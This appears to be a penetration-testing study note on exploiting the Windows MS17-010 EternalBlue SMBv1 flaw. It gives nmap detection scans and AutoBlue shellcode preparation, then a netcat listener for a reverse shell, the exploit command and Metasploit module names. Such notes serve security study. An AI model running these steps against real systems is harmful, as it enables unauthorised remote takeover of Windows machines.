---
up: "[[Exploiting Windows Vulnerabilities]]"
---

# Exploiting Windows EternalBlue SMB Vulnerability

## MS17-010 EternalBlue

- name given to a collection of Windows vulnerabilities
- It was developed by the NSA and was leaked to the public by a hacker group called the Shadow Brokers in 2017
- EternalBlue exploit takes advantages of a vuln in the Windows SMBv1 protocol that allows attackers to send crafted in order to execute arbitrary commands.
- One of the biggest Windows vulnerabilities
- Many users are still using a vulnerable version

It can be exploited using [[Metasploit]] or manually using [[AutoBlue-MS17-010]].

## Demonstration

```bash
nmap -sV -p 445 -O <ip>
```

Detect if system is vulnerable:

```bash
nmap -sV -p 445 --script smb-vuln-ms17-010 <ip>
```

### Exploiting using AutoBlue

clone the repository from 3ndG4me.

First install the requirements:

```bash
pip install -r requirements
cd shellcode
./shell_prep.sh
Y
<my_ip>
1234
1234
1
1
```

Shellcode to be utilized: `sc_x64.bin`

Start a netcat listener on specified port:

```bash
nc -lvnp 1234
```

```bash
python eternalblue_exploit7.py <ip> shellcode/sc_x64.bin
```

Now on the netcat listener should be open a session!

### Exploiting using Metasploit

```bash
# check if target is vulnerable
> use auxiliary/scanner/smb/smb_ms17_010
# exploit vulnerability
> use exploit/windows/smb/ms17_010_eternalblue
> set RHOSTS <ip>
```
